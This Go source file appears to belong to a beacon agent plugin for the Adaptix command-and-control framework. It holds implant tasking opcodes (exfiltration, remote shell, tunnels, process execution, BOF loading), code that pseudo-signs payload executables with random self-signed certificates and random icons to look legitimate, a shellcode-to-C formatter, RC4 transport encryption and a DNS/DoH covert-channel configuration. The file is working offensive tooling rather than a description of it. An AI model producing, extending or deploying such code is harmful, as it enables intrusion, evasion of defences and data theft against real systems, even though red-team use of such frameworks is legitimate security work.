package main

import (
	"bytes"
	"compress/zlib"
	"crypto/rc4"
	"encoding/binary"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"io"
	"math/rand/v2"
	"net"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2"
)

const (
	COMMAND_CAT          = 24
	COMMAND_COPY         = 12
	COMMAND_CD           = 8
	COMMAND_DISKS        = 15
	COMMAND_DOWNLOAD     = 32
	COMMAND_EXEC_BOF     = 50
	COMMAND_EXEC_BOF_OUT = 51
	COMMAND_EXFIL        = 35
	COMMAND_GETUID       = 22
	COMMAND_JOBS_KILL    = 47
	COMMAND_JOB_LIST     = 46
	COMMAND_LINK         = 38
	COMMAND_LS           = 14
	COMMAND_MV           = 18
	COMMAND_MKDIR        = 27
	COMMAND_PIVOT_EXEC   = 37
	COMMAND_PS_LIST      = 41
	COMMAND_PS_KILL      = 42
	COMMAND_PS_RUN       = 43
	COMMAND_PROFILE      = 21
	COMMAND_PWD          = 4
	COMMAND_REV2SELF     = 23
	COMMAND_RM           = 17
	COMMAND_TERMINATE    = 10
	COMMAND_UNLINK       = 39
	COMMAND_UPLOAD       = 33

	COMMAND_TUNNEL_START_TCP = 62
	COMMAND_TUNNEL_START_UDP = 63
	COMMAND_TUNNEL_WRITE_TCP = 64
	COMMAND_TUNNEL_WRITE_UDP = 65
	COMMAND_TUNNEL_CLOSE     = 66
	COMMAND_TUNNEL_REVERSE   = 67
	COMMAND_TUNNEL_ACCEPT    = 68
	COMMAND_TUNNEL_PAUSE     = 69
	COMMAND_TUNNEL_RESUME    = 70

	COMMAND_SHELL_START  = 71
	COMMAND_SHELL_WRITE  = 72
	COMMAND_SHELL_CLOSE  = 73
	COMMAND_SHELL_ACCEPT = 74

	COMMAND_JOB        = 0x8437
	COMMAND_SAVEMEMORY = 0x2321
	COMMAND_ERROR      = 0x1111ffff
)

const (
	DOWNLOAD_START    = 0x1
	DOWNLOAD_CONTINUE = 0x2
	DOWNLOAD_FINISH   = 0x3
)

const (
	JOB_TYPE_LOCAL   = 0x1
	JOB_TYPE_REMOTE  = 0x2
	JOB_TYPE_PROCESS = 0x3
	JOB_TYPE_SHELL   = 0x4
)

const (
	JOB_STATE_STARTING = 0x0
	JOB_STATE_RUNNING  = 0x1
	JOB_STATE_FINISHED = 0x2
	JOB_STATE_KILLED   = 0x3
)

const (
	CALLBACK_OUTPUT      = 0x0
	CALLBACK_OUTPUT_OEM  = 0x1e
	CALLBACK_OUTPUT_UTF8 = 0x20
	CALLBACK_ERROR       = 0x0d
	CALLBACK_CUSTOM      = 0x1000
	CALLBACK_CUSTOM_LAST = 0x13ff

	CALLBACK_AX_SCREENSHOT   = 0x81
	CALLBACK_AX_DOWNLOAD_MEM = 0x82

	BOF_ERROR_PARSE     = 0x101
	BOF_ERROR_SYMBOL    = 0x102
	BOF_ERROR_MAX_FUNCS = 0x103
	BOF_ERROR_ENTRY     = 0x104
	BOF_ERROR_ALLOC     = 0x105
)

// DNS Constants
const (
	dnsDefaultLabelSize = 48
	dnsMaxLabelSize     = 63
	dnsFrameHeaderSize  = 5 // flags:1 + origLen:4
	dnsCompressFlag     = 0x1
)

func CreateTaskCommandSaveMemory(ts Teamserver, agentId string, buffer []byte) int {
	chunkSize := 0x100000 // 1Mb
	memoryId := int(rand.Uint32())

	bufferSize := len(buffer)

	taskData := adaptix.TaskData{
		Type:    adaptix.TASK_TYPE_TASK,
		AgentId: agentId,
		Sync:    false,
	}

	for start := 0; start < bufferSize; start += chunkSize {
		fin := start + chunkSize
		if fin > bufferSize {
			fin = bufferSize
		}

		array := []interface{}{COMMAND_SAVEMEMORY, memoryId, bufferSize, fin - start, buffer[start:fin]}
		taskData.Data, _ = PackArray(array)
		taskData.TaskId = fmt.Sprintf("%08x", rand.Uint32())

		ts.TsTaskCreate(agentId, "", "", taskData)
	}
	return memoryId
}

func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isServer bool, systemArch string) (int, string) {
	var (
		desc string
		os   = adaptix.OS_UNKNOWN
	)

	osVersion := "unknown"
	if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 26100 {
		osVersion = "Win 2025 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 19045 {
		osVersion = "Win 2022 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 17763 {
		osVersion = "Win 2019 Serv"
	} else if majorVersion == 10 && minorVersion == 0 && !isServer && buildNumber >= 22000 {
		osVersion = "Win 11"
	} else if majorVersion == 10 && minorVersion == 0 && isServer {
		osVersion = "Win 2016 Serv"
	} else if majorVersion == 10 && minorVersion == 0 {
		osVersion = "Win 10"
	} else if majorVersion == 6 && minorVersion == 3 && isServer {
		osVersion = "Win Serv 2012 R2"
	} else if majorVersion == 6 && minorVersion == 3 {
		osVersion = "Win 8.1"
	} else if majorVersion == 6 && minorVersion == 2 && isServer {
		osVersion = "Win Serv 2012"
	} else if majorVersion == 6 && minorVersion == 2 {
		osVersion = "Win 8"
	} else if majorVersion == 6 && minorVersion == 1 && isServer {
		osVersion = "Win Serv 2008 R2"
	} else if majorVersion == 6 && minorVersion == 1 {
		osVersion = "Win 7"
	}

	desc = osVersion + " " + systemArch
	if strings.Contains(osVersion, "Win") {
		os = adaptix.OS_WINDOWS
	}
	return os, desc
}

func int32ToIPv4(ip uint) string {
	b := []byte{
		byte(ip),
		byte(ip >> 8),
		byte(ip >> 16),
		byte(ip >> 24),
	}
	return net.IP(b).String()
}

// validateICOFile checks minimal .ico header (Windows icon resource type 1).
func validateICOFile(data []byte) error {
	if len(data) < 6 {
		return errors.New("icon: file too small")
	}
	if data[0] != 0 || data[1] != 0 {
		return errors.New("icon: invalid reserved field")
	}
	if data[2] != 1 || data[3] != 0 {
		return errors.New("icon: expected a Windows .ico file")
	}
	n := int(data[4]) | int(data[5])<<8
	if n < 1 {
		return errors.New("icon: no images in file")
	}
	return nil
}

// generateRandomICO builds a single 32×32 icon (PNG payload inside .ico, Windows-compatible).
func generateRandomICO() ([]byte, error) {
	const w, h = 32, 32
	img := image.NewNRGBA(image.Rect(0, 0, w, h))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			img.SetNRGBA(x, y, color.NRGBA{
				R: uint8(rand.Uint32()),
				G: uint8(rand.Uint32()),
				B: uint8(rand.Uint32()),
				A: 255,
			})
		}
	}
	var pngBuf bytes.Buffer
	if err := png.Encode(&pngBuf, img); err != nil {
		return nil, err
	}
	pngData := pngBuf.Bytes()

	var out bytes.Buffer
	_, _ = out.Write([]byte{0, 0, 1, 0, 1, 0})
	_ = out.WriteByte(w)
	_ = out.WriteByte(h)
	_ = out.WriteByte(0)
	_ = out.WriteByte(0)
	_ = binary.Write(&out, binary.LittleEndian, uint16(1))
	_ = binary.Write(&out, binary.LittleEndian, uint16(32))
	_ = binary.Write(&out, binary.LittleEndian, uint32(len(pngData)))
	_ = binary.Write(&out, binary.LittleEndian, uint32(22))
	_, _ = out.Write(pngData)
	return out.Bytes(), nil
}

const exePseudoSignPfxPass = "ax-pseudo-sign"

func randomFakeSignDN() (cn, org string) {
	cn = fmt.Sprintf("App-%08X%08X", rand.Uint32(), rand.Uint32())
	org = fmt.Sprintf("Vendor-%08X", rand.Uint32())
	return cn, org
}

func runCmdCombined(dir, name string, args ...string) (string, error) {
	cmd := exec.Command(name, args...)
	cmd.Dir = dir
	out, err := cmd.CombinedOutput()
	s := string(out)
	if err != nil {
		return s, fmt.Errorf("%s %v failed: %w\n%s", name, args, err, s)
	}
	return s, nil
}

// pseudoSignMissingTool 返回 applySelfSignedAuthenticode 所缺的外部工具名（两个都在则返回 ""）。
// 判据与下面那两次 LookPath 相同，单独拎出来是为了让调用方能**区分「工具没装」与「签名跑失败」**：
// 前者降级跳过（可选的签名步骤不该阻塞载荷生成），后者仍要终止（可能已写出半份产物）。
func pseudoSignMissingTool() string {
	if _, err := exec.LookPath("openssl"); err != nil {
		return "openssl"
	}
	if _, err := exec.LookPath("osslsigncode"); err != nil {
		return "osslsigncode"
	}
	return ""
}

// applySelfSignedAuthenticode signs inExe with an ephemeral self-signed cert (random CN/O) and writes outExe.
// Produces a real Authenticode blob that Windows shows as signed but the chain is untrusted (pseudo-signature).
// Requires openssl and osslsigncode on the teamserver PATH.
func applySelfSignedAuthenticode(inExe, outExe, workDir string) error {
	if _, err := exec.LookPath("openssl"); err != nil {
		return errors.New("pseudo-sign requires openssl in PATH")
	}
	if _, err := exec.LookPath("osslsigncode"); err != nil {
		return errors.New("pseudo-sign requires osslsigncode in PATH")
	}
	keyPEM := filepath.Join(workDir, "ax_pseudo_key.pem")
	certPEM := filepath.Join(workDir, "ax_pseudo_cert.pem")
	pfxPath := filepath.Join(workDir, "ax_pseudo.pfx")
	cn, org := randomFakeSignDN()
	subj := "/CN=" + cn + "/O=" + org
	if _, err := runCmdCombined(workDir, "openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", keyPEM); err != nil {
		return err
	}
	if _, err := runCmdCombined(workDir, "openssl", "req", "-new", "-x509", "-key", keyPEM, "-sha256", "-days", "365", "-out", certPEM, "-subj", subj); err != nil {
		return err
	}
	if _, err := runCmdCombined(workDir, "openssl", "pkcs12", "-export", "-out", pfxPath, "-inkey", keyPEM, "-in", certPEM, "-passout", "pass:"+exePseudoSignPfxPass); err != nil {
		return err
	}
	absIn, err := filepath.Abs(inExe)
	if err != nil {
		return err
	}
	absOut, err := filepath.Abs(outExe)
	if err != nil {
		return err
	}
	_, err = runCmdCombined(workDir, "osslsigncode", "sign",
		"-h", "sha256",
		"-pkcs12", pfxPath,
		"-pass", exePseudoSignPfxPass,
		"-in", absIn,
		"-out", absOut,
	)
	return err
}

func SizeBytesToFormat(bytes int64) string {
	const (
		KB = 1024.0
		MB = KB * 1024
		GB = MB * 1024
	)

	size := float64(bytes)

	if size >= GB {
		return fmt.Sprintf("%.2f Gb", size/GB)
	} else if size >= MB {
		return fmt.Sprintf("%.2f Mb", size/MB)
	}
	return fmt.Sprintf("%.2f Kb", size/KB)
}

// formatShellcodeAsC renders raw shellcode bytes as a C source snippet (array + length constant).
func formatShellcodeAsC(data []byte) string {
	var b strings.Builder
	b.WriteString("/* Adaptix beacon shellcode (generated) */\n")
	b.WriteString("unsigned char beacon_shellcode[] = {\n")
	for i := 0; i < len(data); i++ {
		if i%12 == 0 {
			b.WriteString("\t")
		}
		b.WriteString(fmt.Sprintf("0x%02x", data[i]))
		if i+1 < len(data) {
			b.WriteString(", ")
		}
		if (i+1)%12 == 0 || i+1 == len(data) {
			b.WriteString("\n")
		}
	}
	b.WriteString("};\n")
	b.WriteString(fmt.Sprintf("const unsigned int beacon_shellcode_len = %d;\n", len(data)))
	return b.String()
}

func RC4Crypt(data []byte, key []byte) ([]byte, error) {
	rc4crypt, errcrypt := rc4.NewCipher(key)
	if errcrypt != nil {
		return nil, errors.New("rc4 crypt error")
	}
	decryptData := make([]byte, len(data))
	rc4crypt.XORKeyStream(decryptData, data)
	return decryptData, nil
}

func deriveTransportSubkey(sessionKey, salt []byte) []byte {
	sub := make([]byte, 16)
	for i := 0; i < 16; i++ {
		sub[i] = sessionKey[i] ^ sessionKey[(i+1)%16] ^ salt[i]
	}
	return sub
}

// SplitSessionMaterial returns 16-byte session RC4 key and 16-byte transport salt from stored agent.SessionKey (32 bytes).
func SplitSessionMaterial(key []byte) (sessionKey, salt []byte, err error) {
	if len(key) == 32 {
		sk := make([]byte, 16)
		s := make([]byte, 16)
		copy(sk, key[:16])
		copy(s, key[16:32])
		return sk, s, nil
	}
	if len(key) == 16 {
		return key, make([]byte, 16), nil
	}
	return nil, nil, fmt.Errorf("session material: need 16 or 32 bytes, got %d", len(key))
}

// SessionTransportCrypt: RC4(sessionKey) then RC4(derive(sessionKey,salt)). Matches beacon Crypt.cpp.
func SessionTransportCrypt(data []byte, sessionKey, salt []byte, decrypt bool) ([]byte, error) {
	if len(sessionKey) != 16 || len(salt) != 16 {
		return nil, errors.New("session key and transport salt must be 16 bytes")
	}
	sub := deriveTransportSubkey(sessionKey, salt)
	if decrypt {
		out, err := RC4Crypt(data, sub)
		if err != nil {
			return nil, err
		}
		return RC4Crypt(out, sessionKey)
	}
	out, err := RC4Crypt(data, sessionKey)
	if err != nil {
		return nil, err
	}
	return RC4Crypt(out, sub)
}

func parseDurationToSeconds(input string) (int, error) {
	re := regexp.MustCompile(`(\d+)(h|m|s)`)
	matches := re.FindAllStringSubmatch(input, -1)

	totalSeconds := 0
	for _, match := range matches {
		value, err := strconv.Atoi(match[1])
		if err != nil {
			return 0, err
		}

		switch match[2] {
		case "h":
			totalSeconds += value * 3600
		case "m":
			totalSeconds += value * 60
		case "s":
			totalSeconds += value
		}
	}

	return totalSeconds, nil
}

func parseStringToWorkingTime(WorkingTime string) (int, error) {
	IntWorkingTime := 0
	if WorkingTime != "" {
		match, err := regexp.MatchString("^[012]?[0-9]:[0-6][0-9]-[012]?[0-9]:[0-6][0-9]$", WorkingTime)
		if err != nil || match == false {
			return IntWorkingTime, errors.New("Failed to parse working time: Invalid format")
		}

		startAndEnd := strings.Split(WorkingTime, "-")
		startHourandMinutes := strings.Split(startAndEnd[0], ":")
		endHourandMinutes := strings.Split(startAndEnd[1], ":")

		startHour, _ := strconv.Atoi(startHourandMinutes[0])
		startMin, _ := strconv.Atoi(startHourandMinutes[1])
		endHour, _ := strconv.Atoi(endHourandMinutes[0])
		endMin, _ := strconv.Atoi(endHourandMinutes[1])

		if startHour < 0 || startHour > 24 || endHour < 0 || endHour > 24 || startMin < 0 || startMin > 60 || endMin < 0 || endMin > 60 {
			return IntWorkingTime, errors.New("Failed to parse working time: Incorrectly defined time")
		}

		if endHour < startHour || (startHour == endHour && endMin <= startMin) {
			return IntWorkingTime, errors.New("Failed to parse working time: The end hour cannot be earlier than the start hour")
		}

		IntWorkingTime |= startHour << 24
		IntWorkingTime |= startMin << 16
		IntWorkingTime |= endHour << 8
		IntWorkingTime |= endMin << 0
	}

	return IntWorkingTime, nil
}

func formatBurstStatus(enabled int, sleepMs int, jitterPct int) string {
	if enabled == 0 {
		return "off"
	}
	return fmt.Sprintf("on (sleep=%dms, jitter=%d%%)", sleepMs, jitterPct)
}

// buildDNSProfileParams returns only the DNS-specific tail of the transport
// profile -- the caller appends it after the common six-field prefix. The C
// side reads these twelve fields, in this order, right after `listener_type`
// (src_beacon/beacon/AgentConfig.cpp, BEACON_DNS branch). `encrypt_key` is
// deliberately absent: it never travels in this list, the C side aliases it to
// the config-level key it already extracted from the outer profile array.
func buildDNSProfileParams(generateConfig GenerateConfig, listenerMap map[string]any, userAgent string) ([]interface{}, error) {

	domain, _ := listenerMap["domain"].(string)

	resolvers := generateConfig.DnsResolvers
	if resolvers == "" {
		resolvers, _ = listenerMap["resolvers"].(string)
	}

	dohResolvers := generateConfig.DohResolvers
	if dohResolvers == "" {
		dohResolvers = "https://dns.google/dns-query,https://cloudflare-dns.com/dns-query,https://dns.quad9.net/dns-query"
	}

	// DNS mode: 0=UDP, 1=DoH, 2=UDP->DoH fallback, 3=DoH->UDP fallback
	dnsMode := 0 // Default to UDP
	switch generateConfig.DnsMode {
	case "DNS (Direct UDP)":
		dnsMode = 0
	case "DoH (DNS over HTTPS)":
		dnsMode = 1
	case "DNS -> DoH fallback":
		dnsMode = 2
	case "DoH -> DNS fallback":
		dnsMode = 3
	}

	qtype, _ := listenerMap["qtype"].(string)

	pktSizeF, _ := listenerMap["pkt_size"].(float64)
	ttlF, _ := listenerMap["ttl"].(float64)
	labelSizeF, _ := listenerMap["label_size"].(float64)

	pktSize := int(pktSizeF)
	ttl := int(ttlF)
	labelSize := int(labelSizeF)
	if labelSize <= 0 || labelSize > dnsMaxLabelSize {
		labelSize = dnsDefaultLabelSize
	}

	burstEnabledF, _ := listenerMap["burst_enabled"].(bool)
	burstSleepF, _ := listenerMap["burst_sleep"].(float64)
	burstJitterF, _ := listenerMap["burst_jitter"].(float64)

	burstEnabled := 0
	if burstEnabledF {
		burstEnabled = 1
	}
	burstSleep := int(burstSleepF)
	if burstSleep <= 0 {
		burstSleep = 50
	}
	burstJitter := int(burstJitterF)
	if burstJitter < 0 || burstJitter > 90 {
		burstJitter = 0
	}

	params := []interface{}{
		domain,
		resolvers,
		dohResolvers,
		qtype,
		pktSize,
		labelSize,
		ttl,
		burstEnabled,
		burstSleep,
		burstJitter,
		dnsMode, // DNS mode (0=UDP, 1=DoH, 2=UDP->DoH, 3=DoH->UDP)
		userAgent,
	}

	return params, nil
}

func appendDNSObjectFiles(files string, objectDir string, ext string) string {
	files += objectDir + "/DnsCodec" + ext + " "
	files += objectDir + "/miniz" + ext + " "
	return files
}

func decompressZlibData(data []byte) ([]byte, bool) {
	if len(data) < dnsFrameHeaderSize {
		return data, false
	}
	flags := data[0]
	origLen := int(data[1]) | int(data[2])<<8 | int(data[3])<<16 | int(data[4])<<24

	if origLen <= 0 {
		return data, false
	}

	payload := data[dnsFrameHeaderSize:]
	if (flags & dnsCompressFlag) != 0 {
		r, err := zlib.NewReader(bytes.NewReader(payload))
		if err != nil {
			return data, false
		}
		var buf bytes.Buffer
		_, err = io.Copy(&buf, r)
		_ = r.Close()
		if err == nil && buf.Len() == origLen {
			return buf.Bytes(), true
		}
		return data, false
	}

	if len(payload) == origLen {
		return payload, true
	}

	return data, false
}
